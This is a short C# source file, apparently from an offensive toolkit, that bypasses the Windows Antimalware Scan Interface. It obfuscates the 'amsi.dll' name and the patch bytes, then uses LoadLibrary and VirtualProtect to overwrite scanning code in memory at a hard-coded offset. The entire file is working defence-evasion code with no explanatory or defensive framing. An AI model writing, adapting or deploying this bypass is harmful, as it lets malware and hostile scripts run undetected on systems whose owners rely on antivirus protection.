using System;
using System.Runtime.InteropServices;

public class Amsi
{
    static byte[] patch = new byte[] { 0xBA, 0x59, 0x02, 0x09, 0x82, 0xC5 };
	
	
    
    public static void Bypass()
	{
		try
		{
			for (int i = 0; i < patch.Length; i++)
			{
				patch[i] = (byte)(patch[i] - 0x2);
			}
			
			var test = new Byte[] {0x61, 0x6d, 0x73, 0x69, 0x2e, 0x64, 0x6c, 0x6c};
			var lib = Win32.LoadLibrary(System.Text.Encoding.Default.GetString(test));
			IntPtr ASBPtr = new IntPtr(lib.ToInt64() + 9536);
			uint oldProtect;
			Win32.VirtualProtect(ASBPtr, (UIntPtr)patch.Length, 0x40, out oldProtect);
			Marshal.Copy(patch, 0, ASBPtr, patch.Length);
			Win32.VirtualProtect(ASBPtr, (UIntPtr)patch.Length, oldProtect, out oldProtect);
		}
		catch (Exception e)
		{
			Console.WriteLine("[x] {0}", e.Message);
			Console.Write("[x] {0}", e.InnerException);
		}
	}
}

class Win32
{

    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);

    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}